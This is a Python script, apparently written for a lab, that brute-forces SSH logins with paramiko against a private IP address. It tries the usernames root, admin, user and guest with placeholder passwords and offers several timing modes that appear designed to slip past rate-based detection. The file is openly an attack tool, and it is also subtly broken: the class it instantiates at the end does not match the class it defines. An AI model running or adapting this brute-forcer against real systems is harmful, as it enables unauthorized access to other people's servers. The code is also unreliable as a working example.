import os,re,sys,time
import random
import paramiko

class SSH_SBF_attack_code:

    def __init__(self):
        # socket
        self.host = "192.168.64.53"
        self.port = 22

        # 계정 리스트
        self.usernames = [
            "root",
            "admin",
            "user",
            "guest"
        ]


    def attack(self):
        try:
            print("""
1. 빠르게 → 느리게
2. 느리게 → 빠르게
3. 랜덤 (8~60초)
4. 수동 입력
5. 일반 브루트포스 (고정)
""")
            mode = int(input("패턴 선택: "))
            count = int(input("시도 횟수: "))

            for i in range(count):
                username = random.choice(self.usernames)
                password = f"guess{i}"
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(
                    paramiko.AutoAddPolicy()
                )

                try:
                    print(f"\n[{i}] SSH LOGIN TRY")
                    print(f"ID: {username}")
                    print(f"PW: {password}")
                    client.connect(
                        hostname=self.host,
                        port=self.port,
                        username=username,
                        password=password,
                        timeout=5,
                        banner_timeout=5,
                        auth_timeout=5
                    )
                    print("공격 성공")

                except Exception as e:
                    print(f"공격 실패: {e}")

                finally:
                    client.close()

                # =========================
                # 패턴별 대기
                # =========================

                if mode == 1:
                    wait = (
                        random.uniform(3, 10)
                        if i < count // 2
                        else random.uniform(20, 120)
                    )

                elif mode == 2:
                    wait = (
                        random.uniform(20, 120)
                        if i < count // 2
                        else random.uniform(3, 10)
                    )

                elif mode == 3:
                    wait = random.uniform(8, 60)

                elif mode == 4:
                    wait = float(input("대기 시간 입력: "))

                elif mode == 5:
                    wait = 1

                else:
                    wait = 3

                print(f"WAIT: {wait:.2f} sec")
                time.sleep(wait)

        except Exception as e:
            print(f"ERROR: {e}")


if __name__ == "__main__":
    attack = SSH_DVWA_attack_code()
    attack.attack()
